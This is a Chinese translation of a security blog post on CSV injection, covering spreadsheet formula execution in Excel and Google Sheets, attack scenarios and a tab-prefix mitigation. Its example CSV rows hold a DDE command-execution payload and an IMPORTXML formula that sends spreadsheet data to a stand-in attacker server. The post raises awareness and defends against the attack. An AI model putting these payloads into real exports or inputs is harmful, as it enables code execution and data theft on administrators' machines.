> * 原文地址：[The Absurdly Underestimated Dangers of CSV Injection](http://georgemauer.net/2017/10/07/csv-injection.html)
> * 原文作者：[georgemauer](http://georgemauer.net/)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/TODO/csv-injection.md](https://github.com/xitu/gold-miner/blob/master/TODO/csv-injection.md)
> * 译者：[mnikn](http://github.com/mnikn)
> * 校对者：

# 被人低估的风险，CSV 注入

最近我在记录当地用户组近期的电费。

在某些方面上看来这是个旧新闻，但是从其他的角度看。。。嗯，我认为很少人意识到这个问题有多强地破坏力和能造成多大范围的损害。对于将用户的输入结果和管理员信息大量地导出到 CSV 文件的应用来说，都存在着一个有效地攻击方向。

对于每个应用都有效。

**编辑：** 值得称赞的是,这些文章指出了这个问题 [一位安全专家 2014 年的文章，里面探讨了一部分攻击方向](https://www.contextis.com/blog/comma-separated-vulnerabilities)。[另外一篇](http://blog.7elements.co.uk/2013/01/cell-injection.html)。

现在我们开始正题吧 - 设想我们有个时间或者票据的记录应用。用户们可以输入自己的时间（或者票据）到应用中，但是不能查看其他用户这部分的信息。然后网站管理员把这些输入信息导出到一个 csv 文件，用一个电子表格应用打开它。看起来很正常。

## 攻击方向 1

我们都知道 csv 文件是什么。其定义的方式很简单，导出来的 csv 文件看起来像是这样的

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
```

够简单。里面没有什么危险的东西。连 [RFC](https://tools.ietf.org/html/rfc4180) 也这样描述：

> CSV 文件里包含的文本应该不会有任何风险。

即使从定义上看，它也应该是安全的。

等下，当作玩一玩我们试一下别的玩法，我们修改 CSV 文件为以下内容

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"=2+5", 240
```
![在 Excel 里计算公式](http://georgemauer.net/img/csv-injection/excel-formula.png) ![在 Google Sheets 里计算公式](http://georgemauer.net/img/csv-injection/gsheets-formula.png)

打开自 Excel（左边）和 Google SheetsIn Excel（右边）。

嗯。。。这很奇怪。虽然单元格处于引用状态，但是它看起来是作为一项公式被处理，就仅仅因为第一个字符是 `=`。实际上 - 至少是在 Excel 里 - 任意符号像 `=`,`-`,`+` 或者 `@` 会触发本身的行为，结果会导致管理员花大量的时间来矫正数据的格式（实际上是这个首先引起了我对这个问题的注意力）。这很奇怪，但不是很**危险**，是这样吗？

再等一下，一条公式**就是**在执行代码。所以用户可以执行代码 - 虽然只是公式代码 - 执行在管理员的机器上，在关系到**用户**信息安全的机器上。

如果我们把 csv 文件改成这样会有什么结果？（注意最后一行的 Description 列）

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"=2+5+cmd|' /C calc'!A0", 240
```

如果我们用 Excel 打开会有什么结果？

![计算器会打开！](http://georgemauer.net/img/csv-injection/calc.png)

额滴神啊！

没错，系统的计算器打开了。

说实话，这**彻彻底底是一个警告**。只是这警告是一大块文字，没人想要读它。即使有人想读，它也会明确建议：

> 只有当你信任这个 workbook 的数据时才点击确定

你想知道会发生什么吗？这是一个应用的导出文件，是给**管理员**用的。当然他们信任这些数据！

如果他们的技术很好呢？那么更糟糕。他们**知道** CSV 格式只是文本数据，因此不可能造成任何伤害。他们十分确信这一点。

就像这样，攻击者有无限制的权力来下载键盘记录，安装东西，不仅仅只是在其他人的电脑上完全远程地执行代码，而且还包括能给接触所有用户数据的人的电脑。例如一个经理或者一间公司的管理员。我想知道在这一系列的文件中隐藏着什么？

# 攻击方向 2

好吧，以上的主要内容挺简短，但是毕竟这是个（一点点）[著名的漏洞](https://www.owasp.org/index.php/CSV_Excel_Macro_Injection)。作为一个安全专家，安全起见你可能想要警告所有的管理员特别注意 Excel，或者会考虑使用 Google Sheets 来代替它。毕竟，Sheets  不会被宏影响，不是吗？

这完全正确。所以我们回到“运行任何东西”的野心上，并把注意力放在仅仅是盗取数据上。毕竟，这里的前提是攻击者是一个普通的用户，他只能接触自己输入在系统上的数据。一个最高的管理员有最高的权力，能看到任何人的数据，我们有什么办法做到这一点吗？

好好回想一下我们虽然不能在 Google Sheets 里运行宏，**但是**我们完全可以运行公式。并且公式不仅仅限制于简单的算术。实际上，我想问下在公式中是否有可用的 Google Sheets 命令能让我们把数据传输到其他地方？答案是有的，有很多的方法可以做到这一点。我们先关注其中的一个方法 [`IMPORTXML `](https://support.google.com/docs/answer/3093342?hl=en)。

> IMPORTXML(url, xpath_query)

当运行这个命令时，它会生成一个 HTTP GET 请求 url，然后尝试解析并把返回数据插入到我们的电子表格。你是不是有一点想法了？

如果我们的 csv 文件有以下内容：

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")",240
```

攻击者以符号 `=` 作为单元格的开头，然后把 `IMPORTXML` 的地址指向了一个攻击者的服务器，并把电子表格的数据作为查询字符串附在该地址上。现在攻击者可以打开他们的服务器日志然后 **yoooooo**！。终于拿到了不属于他们的数据。[在 Requestb.in 上自己试一试](https://requestb.in/)。

有什么踪迹会留下来吗？没有警告，没有弹框，没有任何理由认为有出现过什么问题。攻击者只是输入了一个格式过的时间／导出结果／其他数据的条目，最终管理员当要看导出的 CSV 文件时，所有限制访问的数据都会瞬间，并悄悄地传输出去了。

等一下，**我们能做得更过分**。

公式是运行在管理员的浏览器上的，这里面有**管理员**的用户账号和安全信息。并且 Google Sheets - Sheets 并不是只能操作当前电子表格的数据，实际上它可以从 [**其他**电子表格](https://support.google.com/docs/answer/3093340) 拿数据，只要用户有接触过这些表格就行。而攻击者只需要知道其他表格的 id。这些信息通常不是什么秘密，它出现在电子表格的 url 上，通常会意外地发现电子邮件上有这些信息，或者发布在公司内部的文档上，通过 Google 的安全策略来确保只有授权用户才可以接触这些数据。

所以说，不**只只是**你的导出结果／时间工作表／其他数据可以溜出去。你的管理员有分别接触过客户列表或者工资信息的电子表格？那么这些信息可能也可以搞出去！一切尽在不言中，没有人会知道发生过这些事。一颗赛艇！

当然同样的诡计也可以完美地运行在 Excel 上。实际上，Excel 在这方面上简直是楷模 [警察已经发现这一漏洞并用来追踪犯罪者](https://www.thedailybeast.com/this-is-how-cops-trick-dark-web-drug-dealers-into-unmasking-themselves)。

但事情不一定会这样发展。

我展示这些信息给了大量的安全研究员看，他们还发现了各种方法来抓住犯罪者。例如犯罪者在他们数据中植入了相应的信息，这些信息会指向他们的服务器。这样一来，如果研究员秘密地观察他们在电子表格上的数据，我们就可以发现服务器的地址，然后顺藤摸瓜地找到想要窃取数据的人。

但这个处理方法还不够好。

## 预防

所以这一切到底是谁的错？

当然这不是 CSV 格式的错。格式本身不会自动地执行“像一条公式”的东西，这不是原本就有的用法。这个 bug 依赖于特定的电子表格程序，是程序在实际地做错事。当然 Google Sheets 必须和 Excel 的功能保持一致，而 Excel 必须支持已存在的数百万个复杂的电子表格。另外 - 我不会研究这件事 - 但  Excel 的行为来自于古代的 Lotus 1-2-3 的奇怪处理。目前来说让所有的电子表格程序改变这一行为是一大困难。我想应该把注意力转为改变每个人上。

我曾向 Google 报道他们的电子表格程序有漏洞。他们承认了，但是声称已经意识到了这个问题。虽然我确信他们明白这是一个漏洞，但他们给我一个明显的感觉：他们并没有真正考虑到在实践中可能会被滥用的情况。 至少在 CSV 导入并即将生成外部请求时，Google Sheets 应该发出一个警告。

但是把这件事的责任推在应用程序的开发者上也不是很实际。毕竟，大部分的开发人员没有理由在一个简单的业务应用里写了导出功能后，还会怀疑会出现这个问题。实际上，即使他们阅读 darn RFC 也**仍然**不会有任何线索来发现这个问题。

那么你怎么预防这件事呢？

好吧，尽管 StackOverflow 和其他的网站提供了丰富的建议，但我发现只有一个（没有相应文档）方法可以使用在任意的电子表格程序上：

对于任何以公式触发字符 `=`，`-`，`+`或者 `@` 开头的单元格，您应该直接使用 tab 字符作为前缀。注意，如果单元格里的内容有引号，那么这个字符要在引号**内**。

```
UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
2,2017-07-25,Important Client,"	=2+5", 240
```

这很奇怪，但是起作用了，同时 tab 字符不会显示在 Excel 和 Google Sheets 上。所以这就是我想要的吗？

不幸的是，这个故事还没完。这个字符虽然不会显示，但是仍然存在。用 `=LEN(D4)` 来快速测一下字符串的长度就可以确认这一事实。因此，这只是一个可接受的方案，前提是单元格的值只用来显示，而不会被程序所使用。更进一步，有趣的是这个字符会造成奇怪的不一致。csv 格式用在**应用程序之间**的信息交流上。这意味着从一个应用程序导出的转义单元格的数据将会被另一个应用程序导入并作为数据的一部分。

最终糟糕的结果则是当生成 csv 导出文件时，你**必须知道这导出文件是用来做什么的**。

* 如果是为了在电子表格程序中计算时的能够看到这些数据，则应使用 tab 来转义。实际上这更重要，因为您不希望在导出到电子表格时字符串是“-2 + 3”时出现的结果为“1”，这让人感觉就像是用编程语言解析的结果。
* 如果它被用作系统间的数据交流，那么不要转义任何东西。
* 如果您不知道会发生什么事情，或者是要在电子表格应用程序中使用，或者随后这个电子表格将被用作软件的导入源，放弃吧，只能祈祷不会发生什么事情了（或者，**总是**在使用 Excel 时断开网络连接，并在工作时遵循所有的安全提示）（编辑：这并非 100％ 安全，因为攻击者仍然可以使用宏，让自己的二进制文件来覆盖已知的文件。去他的。）。

这是一场恶梦，这很邪恶，会造成损失，而且还没有明确的解决方案。同时这个漏洞也应该要让更多更多的人知道。


---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[React](https://github.com/xitu/gold-miner#react)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计) 等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
